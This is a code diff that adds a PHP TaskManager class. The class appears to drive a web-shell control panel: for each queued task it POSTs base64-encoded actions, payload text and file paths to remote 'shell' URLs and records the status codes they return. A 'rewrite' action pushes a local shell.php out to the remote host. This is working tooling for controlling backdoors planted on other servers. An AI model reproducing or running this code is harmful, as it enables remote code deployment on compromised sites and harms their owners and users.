@@ -1,0 +1,150 @@
+<?php
+
+class TaskManager implements ISingleton
+{
+	/**
+	 * @var TaskManager
+	 */
+	private static $_instance;
+
+	/**
+	 * @return TaskManager
+	 */
+	private function __construct()
+	{}
+
+	/**
+	 * @return TaskManager
+	 */
+	public static function getInstance()
+	{
+		if (!self::$_instance) {
+			self::$_instance = new self();
+		}
+		return self::$_instance;
+	}
+
+	/**
+	 * Run sequence task process.
+	 *
+	 * @return void
+	 */
+	public function run()
+	{
+		while($task = Task::getInstance()->getNext()) {
+			$this->process($task);
+		}
+	}
+
+	/**
+	 * Process single task
+	 *
+	 * @param TaskRow $task
+	 * @return void
+	 */
+	public function process(TaskRow $task)
+	{
+		try {
+			$this->_log('Process task with id: ' . $task->id);
+
+			// Getting shell
+			$shell = $task->findDependentRowset('Shell')->current();
+			if (!$shell) {
+				throw new Exception('Shell is not specified');
+			}
+
+			// Getting reference shell url
+			if (!$url = $shell->url) {
+				throw new Exception('Cant getting url from task shell');
+			}
+			$this->_log('Reference shell url is ' . $url);
+
+			// Transform url string to Zend_Uri object
+			if (!$uri = Zend_Uri::factory($url)) {
+				throw new Exception('Bad task shell url format: ' . $url);
+			}
+
+			// Getting task action
+			if (!$action = $task->findDependentRowset('Action')->current()) {
+				throw new Exception('Bad action specified for task');
+			}
+			$this->_log('Specified action is ' . $action->name);
+
+
+			if ($action->key == 'rewrite') {
+				if (false === stristr($url, $_SERVER['HTTP_HOST'])) {
+					$test = new RewriteTest();
+					if (!$test->run()) {
+						die('Cant rewrite, shell is broken');
+					}
+				}
+
+
+				$transmit = file_get_contents(Config::getInstance()->path->htdocs . 'shell.php');
+			} else {
+
+				if ($shell->transmit_id) {
+					// Getting transmit
+					$transmit = $shell->findDependentRowset('Transmit')->current();
+					$transmit = $transmit->text;
+					$this->_log('Transmit specified');
+				} else {
+					$transmit = null;
+					$this->_log('Transmit not specified');
+
+				}
+			}
+
+			// Getting path
+			if (!$path = $shell->path) {
+				$this->_log('Shell path to file is not specified');
+			} else {
+				$path = $shell->path;
+				$this->_log('Path to file existing');
+			}
+
+			// Send request to remote host
+			$client = new Zend_Http_Client($uri);
+
+			$client->setParameterPost(array(
+				'action' => base64_encode($action->key),
+				'transmit' => base64_encode($transmit),
+				'path' => base64_encode($path),
+			));
+			$response = $client->request(Zend_Http_Client::POST);
+			if (!$response instanceof Zend_Http_Response) {
+				throw new Exception('Not response from the server');
+			}
+
+			$body = $response->getBody();
+			$task->response_body = $body;
+			preg_match('/\[SR:(\d{3})\]/s', $body, $matches);
+
+			// Check is shell response some answer ?
+			if (!$body || !$code = @$matches[1]) {
+				// Tempolary hack
+				throw new Exception('Shell response is not specified');
+			}
+
+			// Check for defined response code
+			if (!$responseCode = ResponseCode::getInstance()->retrieveByKey($code)) {
+				throw new Exception('Shell response code is not defined: ' . $code);
+			}
+			$this->_log('Shell response is ' . $responseCode->name);
+
+			// Set task shell response to table row
+			$task->response_code_id = $responseCode->id;
+			$task->save();
+
+			return $responseCode->key;
+
+		} catch (Exception $e) {
+			$this->_log($e->getMessage());
+		}
+	}
+
+	private function _log($message)
+	{
+		echo $message . "<br />\n";
+	}
+}
